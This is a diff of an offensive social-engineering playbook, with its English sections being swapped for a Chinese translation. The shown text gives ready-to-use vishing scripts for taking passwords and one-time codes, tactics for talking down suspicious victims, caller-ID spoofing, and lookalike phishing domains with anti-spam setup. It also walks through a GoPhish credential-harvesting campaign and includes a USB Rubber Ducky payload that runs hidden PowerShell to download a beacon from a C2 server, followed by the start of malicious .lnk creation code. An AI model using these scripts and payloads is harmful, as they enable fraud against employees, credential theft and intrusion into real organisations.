-    - Citing a manager name (found on LinkedIn) establishes chain-of-command legitimacy
-
-  Red flag counter: real authority figures can be verified. Your pretext must survive
-  verification or you need to prevent it with urgency or off-hours contact.
-
-PRINCIPLE 2: URGENCY / SCARCITY
-  Time pressure reduces critical thinking. People under pressure skip verification steps.
-
-  SE application:
-    - "Your account is actively being compromised right now"
-    - "The CEO needs this in the next 10 minutes"
-    - "If we do not resolve this today, your access will be suspended"
-    - "The board presentation starts in 20 minutes and the files are in SharePoint"
-
-  Combined with authority: nearly irresistible. The target is in a threat state;
-  their brain shifts from deliberation to action mode.
-
-PRINCIPLE 3: SOCIAL PROOF
-  People follow what others do, especially in uncertain situations.
-
-  SE application:
-    - "Everyone in your department already completed the account verification"
-    - "I have already spoken with [colleague name from LinkedIn]; they confirmed the same issue"
-    - "We have already reset accounts for the Finance team: yours is next"
-    - "The rest of your floor is coming down for the badge verification today"
-
-PRINCIPLE 4: RECIPROCITY
-  People feel obligated to return favors. If you give something, they feel they owe you.
-
-  SE application:
-    - Help desk scenario: "I helped you avoid a security incident; I just need you to
-      verify a few things so I can complete the protection on your account"
-    - Lead with a solution: "I have already fixed the issue on our end: I just need
-      you to confirm one detail so I can close the ticket"
-    - Deliver something useful first (resolve a minor issue) then make the ask
-
-PRINCIPLE 5: LIKING
-  People comply with people they like, or who are like them.
-
-  SE application:
-    - Match their communication style (formal vs. casual)
-    - Reference shared context: "I know you are in the Denver office: we support
-      that location specifically"
-    - Use the target name naturally: builds rapport fast
-    - Mirror their pace: match speed and tone of their speech
-    - Reference current events at the company: layoffs, product launches, restructuring
-      (shows you are "one of them")
-
-PRINCIPLE 6: COMMITMENT / CONSISTENCY
-  Once someone agrees to a small thing, they feel pressure to be consistent with that.
-
-  SE application (yes-ladder technique):
-    "Can you confirm you ARE [NAME] on the [DEPARTMENT] team?" --> yes
-    "And your account IS the one showing the alert?" --> yes
-    "So you DO want me to secure it?" --> yes
-    "Then I will need you to verify your current credentials so we can proceed."
-    Each yes commits them further. Refusal at step 4 would be inconsistent.
-
-COMBINING PRINCIPLES:
-  Authority + Urgency: "IT Security + your account is compromised right now" --> overwhelming
-  Liking + Social Proof: "You know [colleague], who already did this" --> very effective
-  Reciprocity + Commitment: "I have already done X for you; you agreed to Y; just confirm Z"
-```
-
----
-
-### 2.2 ELICITATION TECHNIQUES
+在构建任何托词之前，先理解人们为何顺从。Robert Cialdini 的六大原则是每一次有效社会工程攻击的基础。把这些当作框架来学，而不是话术。只要理解了原则，你就能从零构建任何托词。
 
 ```
-WHAT ELICITATION IS:
-  Extracting information from someone during a natural conversation without them
-  realizing they provided intelligence. No scripts. No demands.
-  The target walks away thinking they had a pleasant chat.
+原则 1：权威
+  人们会服从感知到的权威人物。白大褂、制服、头衔
+  和自信的举止都在传递权威信号。
 
-TECHNIQUE 1: FLATTERY + DISBELIEF (BRACKETING)
-  State something slightly wrong or undervalue their knowledge.
-  People correct inaccuracies about their own domain.
+  社会工程应用：
+    - 来电显示伪装成 IT 服务台号码
+    - 穿印有知名公司名称的制服或厂商背心
+    - 头衔：“IT 安全团队”“公司审计”“高管支持”
+    - 引用（从 LinkedIn 找到的）经理姓名，建立指挥链合法性
 
-  Example:
-    "I heard your security team only has about 5 people."
-    Target: "Actually it is 23, and we cover three sites."
-    You: "So you must handle all the access control management centrally?"
-    Target: "Yeah, it is all on the Genetec system now..."
-    
-    You learned: team size, camera/access control vendor, when they migrated.
-    None of those were asked directly.
+  红旗反制：真正的权威人物可以被核实。你的托词必须经得起
+  核实，否则就要用紧迫性或非工作时间联系来阻止核实。
 
-TECHNIQUE 2: MUTUAL SHARING (QUID PRO QUO FRAMING)
-  Share information first (even if generic), which prompts them to share in return.
+原则 2：紧迫 / 稀缺
+  时间压力会削弱批判性思维。人在压力下会跳过核实步骤。
 
-  Example:
-    "We have been working with a lot of clients moving to SEOS cards."
-    Target: "Yeah we are in the middle of that migration now, about 40% done.
-    The IT closets on floors 3 and 4 still have the old readers."
-    
-    You learned: which floors have legacy (clonable) access control.
+  社会工程应用：
+    - “你的账户此刻正在被入侵”
+    - “CEO 十分钟内就要这个”
+    - “如果我们今天不解决，你的访问权限就会被停用”
+    - “董事会演示 20 分钟后就开始了，文件都在 SharePoint 上”
 
-TECHNIQUE 3: NAIVE QUESTIONING
-  Pretend to know less than you do. Experts love to explain.
+  与权威结合：几乎无法抗拒。目标处于威胁状态；
+  大脑从审慎模式切换到行动模式。
 
-  Example:
-    "I am still learning how access control systems work: what does the badge
-    reader actually communicate back to?"
-    Target: "Well, it sends the Wiegand signal to the panel, which checks against..."
+原则 3：社会认同
+  人们会跟随他人的做法，在不确定的情境下尤其如此。
 
-TECHNIQUE 4: FALSE STATEMENTS AS BAIT
-  State something deliberately wrong and wait for the correction.
+  社会工程应用：
+    - “你部门里的每个人都已完成账户验证了”
+    - “我已经和 [LinkedIn 上的同事姓名] 谈过；他们也确认了同样的问题”
+    - “我们已为财务团队重置了账户：下一个就是你”
+    - “你这一层其他人今天都会下来做证件验证”
 
-  Example:
-    "Your system must be all managed from the cloud now, right?"
-    Target: "No actually: we still have an on-prem controller in the basement.
-    IT keeps saying they will migrate it but..."
-    
-    You learned: on-premises access control, IT low priority for it,
-    controller in the basement.
+原则 4：互惠
+  人们觉得有义务回报人情。你给了东西，他们就欠你。
 
-TECHNIQUE 5: TOPIC SEEDING (INTEREST EXPANSION)
-  Introduce a topic and let them take it wherever it goes.
+  社会工程应用：
+    - 服务台场景：“我帮你避免了一次安全事件；我只需要你
+      核实几件事，好让我完成对你账户的保护”
+    - 先给解决方案：“我这边已经把问题修好了：只需要你
+      确认一个细节，我好把工单关掉”
+    - 先交付有用的东西（解决一个小问题），然后再提要求
 
-  Example:
-    Mention: "I have been dealing with a lot of badge cloning incidents lately."
-    Target security professional: "Yeah we had an incident last year where:
-    actually I should not say too much. But we changed our procedures after it."
-    You: "Oh interesting, we saw something similar at another client."
-    Target: "Yeah, they still have not upgraded the readers on the west entrance..."
+原则 5：喜好
+  人们会顺服自己喜欢、或与自己相似的人。
 
-DELIVERY PRINCIPLES:
-  - Never take notes in front of the target. Memorize. Write notes immediately after.
-  - Let silences breathe. People fill silence. Do not fill it for them.
-  - One piece of information at a time. Do not push for more immediately after a disclosure.
-  - Close the loop: end the conversation naturally. Do not leave them wondering
-    why they felt slightly interrogated.
+  社会工程应用：
+    - 匹配对方的沟通风格（正式 vs. 随意）
+    - 引用共同背景：“我知道你在丹佛办公室：我们专门
+      支持那个地点”
+    - 自然地使用目标的名字：快速建立融洽感
+    - 镜像对方的节奏：匹配语速和语气
+    - 引用公司当前事件：裁员、产品发布、重组
+      （显示你“是他们中的一员”）
 
-OSINT TOOLS FOR SE TARGET PROFILING (use before elicitation):
-  Maltego Community ($0): relationship mapping between people, domains, emails
-  SpiderFoot ($0, open-source): automated OSINT across 200+ data sources
-  Sherlock ($0, GitHub): username search across 300+ platforms simultaneously
-    Usage: python3 sherlock.py target_username
-  hunter.io ($0 basic): email format discovery and verification
-  LinkedIn Sales Navigator: deep company org chart research
-  Spokeo / BeenVerified: phone number and personal address lookup (US)
-  OSINT Framework (osintframework.com): categorized OSINT resource index
+原则 6：承诺 / 一致
+  一旦某人答应了小事，他就会感到压力要与之一致。
+
+  社会工程应用（是字阶梯技巧）：
+    “你能确认你就是 [部门] 团队的 [姓名] 吗？” --> 是
+    “那出现告警的就是你的账户？” --> 是
+    “所以你是希望我把它保护好？” --> 是
+    “那我需要你核实当前的凭证，我们才能继续。”
+    每一次“是”都让他更深地投入。在第 4 步拒绝会显得不一致。
+
+组合原则：
+  权威 + 紧迫：“IT 安全 + 你的账户此刻已被入侵” --> 压倒性
+  喜好 + 社会认同：“你认识 [同事]，他已经做过了” --> 非常有效
+  互惠 + 承诺：“我已经为你做了 X；你答应了 Y；只要确认 Z”
 ```
 
 ---
 
-### 2.3 VISHING: VOICE PHISHING (FULL SCRIPTS + OBJECTION HANDLING)
-
-#### Pre-Call Intelligence
+### 2.2 套话技巧
 
 ```
-OSINT BEFORE EVERY CALL:
-  1. Target name: LinkedIn, company directory, press releases
-  2. Manager name and email format: LinkedIn
-  3. IT helpdesk number: company website (you might call FROM this number)
-  4. Internal terminology: job postings ("we use ServiceNow", "our Salesforce instance")
-  5. Recent company events: earnings calls, layoffs, product launches, incidents
-  6. Email format: hunter.io (shows verified email formats and real addresses)
-  7. IT vendor stack: LinkedIn job postings for "IT Manager" or "Systems Administrator"
+套话是什么：
+  在自然交谈中从某人身上获取信息，而对方并未意识到
+  自己提供了情报。没有话术。没有强求。
+  目标离开时还以为只是进行了一次愉快的闲聊。
 
-VOIP INFRASTRUCTURE:
-  MySudo (iOS/Android): privacy-focused VOIP, custom numbers
-  Twilio (developer API): programmatic, spoof any caller ID number
-  SpoofCard, SpoofTel: dedicated caller ID spoofing services ($0.10-0.25/min)
+技巧 1：恭维 + 质疑（反衬法）
+  说一件稍有偏差的事，或低估对方的知识。
+  人们会纠正关于自己领域的错误说法。
 
-  Spoof to show: IT Help Desk number, HR department, a known vendor support line
-  Background noise: play office ambient audio (YouTube: "office background noise 8 hours")
-  Call time: business hours; avoid Mondays 9-10am (high staff awareness) and Fridays
-```
+  示例：
+    “我听说你们安全团队只有 5 个人。”
+    目标：“其实是 23 个人，我们管三个站点。”
+    你：“那你们一定是集中管理所有门禁吧？”
+    目标：“对，现在全都在 Genetec 系统上……”
+    
+    你了解到：团队规模、摄像头/门禁厂商、迁移时间。
+    这些都没有直接问过。
 
-#### Pretext Scripts
+技巧 2：相互分享（以物易物的框定）
+  先分享信息（哪怕是泛泛的），这会促使对方也分享。
 
-```
-PRETEXT 1: IT HELPDESK --> USER (credential extraction)
+  示例：
+    “我们最近很多客户都在迁往 SEOS 卡。”
+    目标：“对，我们正在迁移，大概完成了 40%。
+    3 层和 4 层的 IT 弱电间还是老读卡器。”
+    
+    你了解到：哪些楼层还有旧式（可克隆）门禁。
 
-Script:
-  "Hi, is this [NAME]? Great. This is [JAMES COLE] from the IT Security team.
-  We are calling because our monitoring system flagged unusual login activity on
-  your account from a location that does not match your usual sign-in pattern.
+技巧 3：天真提问
+  假装比实际懂得少。专家喜欢讲解。
 
-  Can you confirm your employee ID for me? I want to make sure I have the right account."
-  [Pause: they give employee ID or last 4 digits]
+  示例：
+    “我还在学门禁系统怎么工作：读卡器实际是
+    把信息传回哪里？”
+    目标：“嗯，它把 Wiegand 信号发给面板，面板再对照……”
 
-  "Perfect. I am looking at the alert now. We have been resetting credentials for
-  all affected accounts on a rolling basis today. I need you to verify your
-  current password so I can confirm it matches what is in our rotation system:
-  otherwise your reset will not complete cleanly."
+技巧 4：用错误陈述作饵
+  故意说错一件事，等着对方纠正。
 
-OBJECTION HANDLING: THREE-LAYER STRUCTURE
+  示例：
+    “你们系统现在肯定都是云端管理了吧？”
+    目标：“其实不是：我们地下室还有一台本地控制器。
+    IT 一直说会迁，但是……”
+    
+    你了解到：门禁为本地部署、IT 对此优先级低、
+    控制器在地下室。
 
-  Layer 1: Acknowledge + Reframe
-    Target says: "I am not sure I should give my password over the phone."
-    Response: "That is completely the right instinct: and I completely understand.
-    That policy exists to protect you against people who are NOT IT Security.
-    I am calling FROM the IT Security line right now [caller ID shows the correct number].
-    The reason we are doing phone verification today is our email system itself may be
-    compromised: so we cannot use email for the reset. The phone is the secure channel."
+技巧 5：话题播种（兴趣扩展）
+  抛出一个话题，任其发展。
 
-  Layer 2: Social Proof + Urgency
-    Target says: "I really should call IT back directly to verify."
-    Response: "Of course you can: and I would encourage that normally.
-    The issue is your account has an active session right now from [city].
-    I have a 5-minute window to complete this reset before the system auto-locks
-    and the lockout requires an in-person visit to IT. I have 3 other people
-    after you this afternoon: I am genuinely trying to save you that trip."
+  示例：
+    提到：“我最近处理了好多起证件克隆事件。”
+    目标（安全从业者）：“对，我们去年出过一次：
+    其实我不该说太多。但之后我们改了流程。”
+    你：“哦有意思，我们在另一个客户那儿见过类似的情况。”
+    目标：“对，他们西门那边的读卡器到现在都没升级……”
 
-  Layer 3: Lower the Ask
-    Target still will not comply:
-    Response: "No problem at all. Let me take a different path.
-    I do not need the full password. Just give me the last two digits of your
-    employee ID and I can verify from my side and trigger the reset without
-    needing your credentials. That way you have not shared anything sensitive."
-    [Any small compliance keeps the engagement alive]
+实施原则：
+  - 绝不在目标面前做记录。用记忆。事后立刻写笔记。
+  - 让沉默留白。人们会填满沉默。不要替他们填。
+  - 一次只取一条信息。对方透露后不要立刻追问更多。
+  - 收好尾：自然结束对话。不要让对方纳闷
+    为什么自己感觉像被盘问了一下。
 
-MFA BYPASS VARIANT:
-  "Instead of the password, let me send a verification code to your phone.
-  What is the number we have on file for you? I will send the code and you
-  just read it back to me."
-  [They read you the OTP: you use it to log in to their account in real time]
-  [This is the real-time phishing / MFA bypass technique: pair with Evilginx3 for
-  automated capture at scale]
-```
-
-```
-PRETEXT 2: USER --> IT HELPDESK (reset to attacker-controlled channel)
-
-Script:
-  "Hi, this is [SARAH JENKINS] from [MARKETING: department from LinkedIn].
-  I am locked out of my account: I got a new laptop this morning and
-  it is not accepting my password. I have a presentation in 40 minutes
-  and my files are in SharePoint. Can you do an emergency reset?
-
-  [If asked for employee ID:]
-  I do not have my card right in front of me: it is on my desk upstairs.
-  Can you look me up by email? It is [target email address]."
-
-  [When reset is offered:]
-  "Can you send the reset link to my phone number instead of email?
-  My work email is the one locked. My phone is [burner number you control]."
-```
-
-```
-PRETEXT 3: VENDOR --> EXECUTIVE ASSISTANT (facility intelligence)
-
-Script:
-  "Hi, this is [MICHAEL TORRES] from [REAL VENDOR found in job postings].
-  I am calling to confirm the meeting this Thursday with [EXECUTIVE NAME].
-  Our team lead is flying in from [CITY] and I want to make sure we have
-  visitor badges arranged and the right conference room.
-
-  Can you confirm the floor number for the executive suite?
-  And do we check in at reception on the ground floor or is there a
-  separate visitor entrance?
-  What ID format do you take for the visitor log?
-  Should we bring our vendor credentials or is a government ID fine?"
-
-What you extract: floor number, visitor badge process, reception workflow, ID requirements.
-```
-
-#### Vishing Anti-Detection
-
-```
-HANDLING SKEPTICAL TARGETS:
-
-  Sign of suspicion: "How do I know you are really from IT?"
-
-  Response A: Transfer burden:
-    "I completely understand: I can have my manager [FULL NAME] call you back
-    from the helpdesk main line. He is available in about 20 minutes."
-    (Most people do not want to wait 20 minutes and will comply now.)
-
-  Response B: Email verification:
-    "Let me send you an email from my official account right now while we are on the call."
-    (Use your pretext email domain. They see an email arrive. Trust established.)
-
-  Response C: Redirect to a lower ask:
-    "No problem at all. I do not need the password: I just need to verify the
-    last four digits of your employee ID and I can complete the reset on my end."
-
-ABORT CONDITION:
-  Target says: "I am going to call IT directly to verify this."
-  Response: "Of course: please do, and ask for [researched name] on the security team.
-  I will close the ticket from my end and you can re-open it when you have verified.
-  Have a good day." [End call.]
-  
-  Forcing the conversation continues = suspicious behavior.
-  A clean exit = they remember an overly cautious IT interaction, not a vishing attempt.
-
-CALL TIMING:
-  Best call windows:
-    Tuesday to Thursday: 10am-12pm and 2pm-4pm
-    Avoid: Monday morning (low helpfulness), Friday afternoon (escape mode),
-    Avoid: Month-end close (Finance under pressure: less patient)
-  
-  Optimal target personas:
-    Junior employees: highest compliance (want to solve problems, less security training)
-    Administrative assistants: information-rich, authority-responsive
-    IT helpdesk staff: the best target for pretext #2 (they WANT to be helpful)
+社会工程目标画像的 OSINT 工具（套话前使用）：
+  Maltego Community（免费）：映射人、域名、邮箱之间的关系
+  SpiderFoot（免费，开源）：跨 200+ 数据源的自动化 OSINT
+  Sherlock（免费，GitHub）：同时搜索 300+ 平台上的用户名
+    用法：python3 sherlock.py target_username
+  hunter.io（免费基础版）：邮箱格式发现与验证
+  LinkedIn Sales Navigator：深入调研公司组织架构
+  Spokeo / BeenVerified：电话号码与个人住址查询（美国）
+  OSINT Framework（osintframework.com）：分类的 OSINT 资源索引
 ```
 
 ---
 
-### 2.4 EMAIL PHISHING CONSTRUCTION
+### 2.3 语音钓鱼（完整话术 + 异议处理）
+
+#### 通话前情报
 
 ```
-NOTE: This section covers targeted email phishing (spear phishing).
-AiTM phishing (Evilginx3 + GoPhish) is covered in Phase 4F.
-This section covers the email construction and delivery layer.
+每次通话前的 OSINT：
+  1. 目标姓名：LinkedIn、公司通讯录、新闻稿
+  2. 经理姓名与邮箱格式：LinkedIn
+  3. IT 服务台号码：公司网站（你也许能“从这个号码”打出去）
+  4. 内部术语：招聘启事（“我们用 ServiceNow”“我们的 Salesforce 实例”）
+  5. 近期公司事件：财报电话会、裁员、产品发布、安全事件
+  6. 邮箱格式：hunter.io（显示已验证的邮箱格式和真实地址）
+  7. IT 供应商栈：LinkedIn 上“IT 经理”或“系统管理员”的招聘信息
+
+VOIP 基础设施：
+  MySudo（iOS/Android）：注重隐私的 VOIP，可自定义号码
+  Twilio（开发者 API）：可编程，可伪装任意来电号码
+  SpoofCard、SpoofTel：专用来电显示伪装服务（0.10-0.25 美元/分钟）
+
+  伪装显示：IT 服务台号码、HR 部门、已知供应商支持线
+  背景噪音：播放办公室环境音（YouTube：“office background noise 8 hours”）
+  通话时间：工作时段；避开周一 9-10 点（员工警觉度高）和周五
 ```
 
-#### Domain Setup for Phishing
+#### 托词话术
 
 ```
-DOMAIN SELECTION STRATEGY:
-  Typosquatting: company-name.com --> company-narne.com (rn looks like m)
-  Lookalike: microsoft.com --> micros0ft.com, microsofts-security.com
-  Addition: companyname-it.com, companyname-security.com, companyname-hr.com
+托词 1：IT 服务台 --> 用户（套取凭证）
 
-  Register via Namecheap or Porkbun ($8-12/year). Use Whois privacy.
+话术：
+  “你好，是 [姓名] 吗？太好了。我是 IT 安全团队的 [JAMES COLE]。
+  我们打电话是因为监控系统标记了你账户上
+  来自与你平常登录模式不符的地点的异常登录活动。
 
-EMAIL INFRASTRUCTURE (so your email is not flagged as spam):
-  1. SPF record: TXT "v=spf1 a mx include:zoho.com ~all"
-  2. DKIM: your email provider generates keys; add TXT record to DNS
-  3. DMARC: TXT "_dmarc.[yourdomain].com" "v=DMARC1; p=none; rua=mailto:dmarc@..."
-  4. Age the domain: 14-30 days old before sending campaign
-  5. Check reputation: mxtoolbox.com/blacklists + mail-tester.com (score 8+/10)
+  你能跟我确认一下员工工号吗？我要确认对应的是正确的账户。”
+  [停顿：对方给出工号或后 4 位]
+
+  “很好。我正在看告警。我们今天在分批重置
+  所有受影响账户的凭证。我需要你核实
+  当前密码，好让我确认它与我们轮换系统中的记录一致：
+  否则你的重置无法干净完成。”
+
+异议处理：三层结构
+
+  第一层：认可 + 重新框定
+    目标说：“我不确定该不该在电话里给密码。”
+    回应：“这个直觉完全正确：我完全理解。
+    那条政策就是为了保护你不被那些并非 IT 安全的人骗。
+    我此刻就是从 IT 安全线打来的 [来电显示为正确号码]。
+    今天我们之所以用电话核实，是因为我们的邮件系统本身可能
+    已被入侵：所以重置不能用邮件。电话才是安全通道。”
+
+  第二层：社会认同 + 紧迫
+    目标说：“我真的应该直接打回 IT 核实一下。”
+    回应：“当然可以：平时我也会建议你这么做。
+    问题是你的账户此刻有一个来自 [城市] 的活跃会话。
+    我只有 5 分钟窗口来完成重置，否则系统会自动锁定，
+    而解除锁定需要本人到 IT 现场。今天下午我后面还有 3 个人：
+    我真的是想帮你省这一趟。”
+
+  第三层：降低要求
+    目标仍不配合：
+    回应：“完全没问题。我换个路子。
+    我不需要完整密码。只要给我你员工工号的后两位，
+    我就能在我这边核实并触发重置，
+    不需要你的凭证。这样你就没有交出任何敏感信息。”
+    [任何小让步都能让行动继续下去]
+
+MFA 绕过变体：
+  “不用密码，让我给你的手机发一个验证码。
+  我们档案里记的是哪个号码？我把码发过去，
+  你念给我就行。”
+  [对方把 OTP 念给你：你用它实时登录其账户]
+  [这就是实时钓鱼 / MFA 绕过技术：与 Evilginx3 配合可实现
+  规模化自动捕获]
 ```
 
-#### Email Body Construction
+```
+托词 2：用户 --> IT 服务台（把重置引到攻击者控制的通道）
+
+话术：
+  “你好，我是 [MARKETING：LinkedIn 上的部门] 的 [SARAH JENKINS]。
+  我的账户被锁了：我今早刚换了新笔记本，
+  它就是不认我的密码。40 分钟后我有个演示，
+  文件都在 SharePoint 上。你能做个紧急重置吗？
+
+  [若被要求工号：]
+  我的卡不在手边：在楼上桌上。
+  你能用邮箱查到我吗？是 [目标邮箱地址]。”
+
+  [当对方提出重置时：]
+  “能把重置链接发到我手机号而不是邮箱吗？
+  我的工作邮箱就是被锁的那个。我的手机是 [你控制的一次性号码]。”
+```
 
 ```
-STRUCTURE:
-  Line 1: Context (who you are, why you are emailing)
-  Line 2: The "problem" (urgency hook)
-  Line 3: The solution (the call to action)
-  Line 4: Credibility element (reference to known person, ticket number, policy)
-  Line 5: Urgency deadline
-  Call to action: [button] or [link] or [attachment]
+托词 3：供应商 --> 高管助理（设施情报）
 
-HIGH-OPEN-RATE SUBJECTS:
-  Action required:
-    "Action Required: Your account security verification"
-    "Urgent: Suspicious sign-in attempt detected on your account"
-    "Password expiration notice: expires tonight at midnight"
+话术：
+  “你好，我是 [招聘启事里找到的真实厂商] 的 [MICHAEL TORRES]。
+  我打电话是想确认本周四与 [高管姓名] 的会面。
+  我们的团队负责人正从 [城市] 飞过来，我想确认
+  访客证件都安排好了，会议室也对。
+
+  你能确认高管套间在几层吗？
+  我们是在一层前台登记，还是有单独的
+  访客入口？
+  访客登记接受什么证件？
+  需要我们带厂商工牌，还是政府身份证件就行？”
+
+你能套到的：楼层号、访客证件流程、前台工作流程、证件要求。
+```
+
+#### 语音钓鱼的反检测
+
+```
+应对疑虑重的目标：
+
+  怀疑的迹象：“我怎么知道你真的来自 IT？”
+
+  回应 A：转移负担：
+    “我完全理解：我可以让我的经理 [全名] 用服务台
+    主线打回给你。他大概 20 分钟后有空。”
+    （多数人不想等 20 分钟，会当场配合。）
+
+  回应 B：邮件验证：
+    “我这就用我的官方账号给你发一封邮件，我们还在通话。”
+    （用你的托词邮箱域名。对方看到邮件到了。信任就建立了。）
+
+  回应 C：转向更低的要求：
+    “完全没问题。我不需要密码：我只要核实你员工工号的
+    后四位，就能在我这边完成重置。”
+
+中止条件：
+  目标说：“我要直接打给 IT 核实这件事。”
+  回应：“当然：请便，找安全团队的 [调研到的姓名]。
+  我会在我这边关掉工单，你核实完可以再开一张。
+  祝你今天愉快。”[结束通话。]
   
-  Internal-looking:
-    "[COMPANY] HR: Benefits enrollment ends Friday: take action"
-    "[MANAGER NAME] shared a document with you"
-    "Your performance review is ready for signature"
+  硬要把对话继续下去 = 可疑行为。
+  干净退出 = 对方只记得一次过于谨慎的 IT 交互，而不是一次语音钓鱼企图。
+
+通话时机：
+  最佳通话窗口：
+    周二至周四：上午 10 点至 12 点，下午 2 点至 4 点
+    避开：周一上午（帮助意愿低）、周五下午（想着下班）
+    避开：月末结账（财务压力大：耐心更少）
   
-  Targeted by role:
-    IT Admin: "Critical: VMware vSphere certificate expiration warning"
-    Finance: "Wire transfer confirmation required: invoice attached"
-    HR: "New employee onboarding documents: review required"
+  最佳目标人群：
+    初级员工：顺从度最高（想解决问题，安全培训更少）
+    行政助理：信息丰富，对权威敏感
+    IT 服务台人员：托词 2 的最佳目标（他们“想”帮上忙）
+```
+
+---
+
+### 2.4 邮件钓鱼构造
+
+```
+注：本节讲定向邮件钓鱼（鱼叉式钓鱼）。
+AiTM 钓鱼（Evilginx3 + GoPhish）在第 4F 阶段讲述。
+本节涵盖邮件的构造与投递层。
+```
+
+#### 钓鱼域名设置
+
+```
+域名选择策略：
+  误输抢注：company-name.com --> company-narne.com（rn 看起来像 m）
+  形似：microsoft.com --> micros0ft.com、microsofts-security.com
+  添加：companyname-it.com、companyname-security.com、companyname-hr.com
+
+  通过 Namecheap 或 Porkbun 注册（8-12 美元/年）。开启 Whois 隐私保护。
+
+邮件基础设施（避免你的邮件被判为垃圾邮件）：
+  1. SPF 记录：TXT "v=spf1 a mx include:zoho.com ~all"
+  2. DKIM：由你的邮件服务商生成密钥；把 TXT 记录加到 DNS
+  3. DMARC：TXT "_dmarc.[你的域名].com" "v=DMARC1; p=none; rua=mailto:dmarc@..."
+  4. 域名养号：投放行动前让域名有 14-30 天年龄
+  5. 信誉检查：mxtoolbox.com/blacklists + mail-tester.com（得分 8+/10）
+```
+
+#### 邮件正文构造
+
+```
+结构：
+  第 1 行：背景（你是谁，为什么发邮件）
+  第 2 行：“问题”（紧迫性钩子）
+  第 3 行：解决方案（行动号召）
+  第 4 行：可信度要素（提到已知人员、工单号、政策）
+  第 5 行：紧迫期限
+  行动号召：[按钮] 或 [链接] 或 [附件]
+
+高打开率主题：
+  需要操作类：
+    “需要操作：你的账户安全验证”
+    “紧急：检测到你账户上有可疑登录尝试”
+    “密码过期通知：今晚午夜到期”
+  
+  内部邮件风格：
+    “[公司] HR：福利登记周五截止：请尽快处理”
+    “[经理姓名] 与你共享了一份文档”
+    “你的绩效评估已就绪，待签署”
+  
+  按角色定向：
+    IT 管理员：“严重：VMware vSphere 证书过期警告”
+    财务：“需要电汇确认：发票已附”
+    HR：“新员工入职文件：需审阅”
 ```
 
 ```bash
-# GoPhish Campaign Setup:
+# GoPhish 行动设置：
 wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
 unzip gophish-v0.12.1-linux-64bit.zip && chmod +x gophish && ./gophish
-# Admin interface: https://localhost:3333
+# 管理界面：https://localhost:3333
 
-# GoPhish tracks: email sent, opened, clicked, data submitted, reported
+# GoPhish 跟踪：已发送、已打开、已点击、已提交数据、已上报
 
-# GoPhish workflow:
-# 1. Sending Profile: configure SMTP (Zoho/Gmail SMTP with phishing domain)
-# 2. Email Template: paste HTML email; mark {{.URL}} where link goes
-# 3. Landing Page: credential harvest page (or Evilginx3 AiTM target)
-# 4. Users & Groups: import target email list (CSV)
-# 5. Campaign: link everything; schedule; launch
+# GoPhish 工作流：
+# 1. 发送配置：配置 SMTP（用钓鱼域名的 Zoho/Gmail SMTP）
+# 2. 邮件模板：粘贴 HTML 邮件；在放链接处标记 {{.URL}}
+# 3. 落地页：凭证收集页（或 Evilginx3 AiTM 目标）
+# 4. 用户与分组：导入目标邮箱列表（CSV）
+# 5. 行动：把一切关联起来；排期；发起
 
-# Campaign success benchmarks:
-# Baseline: > 30% open rate, > 15% click rate (untrained organization)
-# Good: > 50% open rate, > 30% click rate (well-crafted spear phish)
-# Excellent: > 70% open rate, credential submission from > 20% of clickers
+# 行动成功基准：
+# 基线：打开率 > 30%，点击率 > 15%（未受训组织）
+# 良好：打开率 > 50%，点击率 > 30%（精心制作的鱼叉邮件）
+# 优秀：打开率 > 70%，点击者中 > 20% 提交了凭证
 ```
 
 ---
 
-### 2.5 USB DROP ATTACKS
+### 2.5 USB 投放攻击
 
 ```
-WHAT IT IS:
-  Placing USB drives in locations where target employees are likely to find and plug them in.
-  Human psychology: "Free USB drive!" or "I wonder what is on this?" drives insertion.
+是什么：
+  把 U 盘放在目标员工很可能发现并插入的地方。
+  人的心理：“免费 U 盘！”或“这里面是什么呢？”会驱动插入行为。
 
-PAYLOAD OPTIONS:
-  1. Rubber Ducky / USB Rubber Ducky 3 ($80): HID (keyboard) attack device
-     Appears as a keyboard: executes keystrokes automatically on insertion
-     Use: delivers a PowerShell payload to open a reverse shell
+载荷选项：
+  1. Rubber Ducky / USB Rubber Ducky 3（80 美元）：HID（键盘）攻击设备
+     伪装成键盘：插入后自动执行击键
+     用途：投递一个 PowerShell 载荷以打开反弹 shell
 
-  2. Malicious .lnk shortcut (no special hardware needed):
-     Create a .lnk file that executes a PowerShell download cradle on double-click
-     Name it something irresistible: "Q4_Bonuses_2027.lnk" or "Layoff_List.lnk"
-     Hide in a folder named "CONFIDENTIAL" for maximum click rate
+  2. 恶意 .lnk 快捷方式（无需专用硬件）：
+     创建一个 .lnk 文件，双击时执行 PowerShell 下载 cradle
+     起一个无法抗拒的名字："Q4_Bonuses_2027.lnk" 或 "Layoff_List.lnk"
+     放进名为 "CONFIDENTIAL" 的文件夹，最大化点击率
 
-  3. BadUSB (firmware-based HID attack): ATtiny85 ($3) loaded with DigiSpark firmware
-     Cheaper than Rubber Ducky; slightly less reliable
+  3. BadUSB（基于固件的 HID 攻击）：ATtiny85（3 美元）刷 DigiSpark 固件
+     比 Rubber Ducky 便宜；可靠性略低
 
-USB RUBBER DUCKY: REVERSE SHELL PAYLOAD
+USB RUBBER DUCKY：反弹 SHELL 载荷
 ```
 
 ```bash
-# Rubber Ducky payload (DuckyScript 3.0):
-# Save as payload.txt, inject with DuckyScript encoder
+# Rubber Ducky 载荷（DuckyScript 3.0）：
+# 保存为 payload.txt，用 DuckyScript 编码器注入
 
 DELAY 2000
 GUI r
@@ -1640,10 +1640,10 @@ DELAY 500
 STRING powershell -nop -w hidden -e [BASE64_ENCODED_PAYLOAD]
 ENTER
 
-# Generate the base64 payload (Sliver HTTPS beacon IEX download cradle):
+# 生成 base64 载荷（Sliver HTTPS 信标的 IEX 下载 cradle）：
 PAYLOAD_URL="https://your-c2.yourdomain.com/beacon.ps1"
 
-# Encode for Rubber Ducky:
+# 为 Rubber Ducky 编码：
 python3 -c "
 import base64
 cmd = 'IEX (New-Object Net.WebClient).DownloadString(\"' + '$PAYLOAD_URL' + '\")'
@@ -1653,227 +1653,227 @@ print(b64)
 ```
 
 ```
-MALICIOUS LNK FILE CREATION:
+恶意 LNK 文件创建：
 ```
 
 ```powershell
-# Create a malicious .lnk shortcut that executes a payload silently:
+# 创建一个静默执行载荷的恶意 .lnk 快捷方式：
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut("$env:TEMP\Q4_Bonuses_2027.lnk")
 $shortcut.TargetPath = "powershell.exe"
